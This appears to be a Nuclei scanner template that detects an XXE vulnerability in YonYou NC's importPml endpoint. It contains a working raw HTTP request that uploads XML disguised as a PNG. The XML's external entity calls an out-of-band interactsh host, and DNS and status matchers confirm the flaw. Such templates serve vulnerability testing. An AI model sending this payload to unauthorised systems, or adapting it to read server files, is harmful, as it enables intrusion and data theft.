id: YonYouNC-importPml-XXE

info:
  name: YonYouNC-importPml-XXE
  severity: high
  description: |
    YonYouNC-importPml-XXE.
  metadata:
    verified: true
    max-request: 1

http:
  - raw:
      - |
        POST /portal/pt/portalpage/importPml?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybXJ4bi5uZXQ

        ------WebKitFormBoundarybXJ4bi5uZXQ
        Content-Disposition: form-data; name="file"; filename="1.png"

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
        ]>
        <root>
          <TextResult>&xxe;</TextResult>
        </root>
        ------WebKitFormBoundarybXJ4bi5uZXQ--

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200
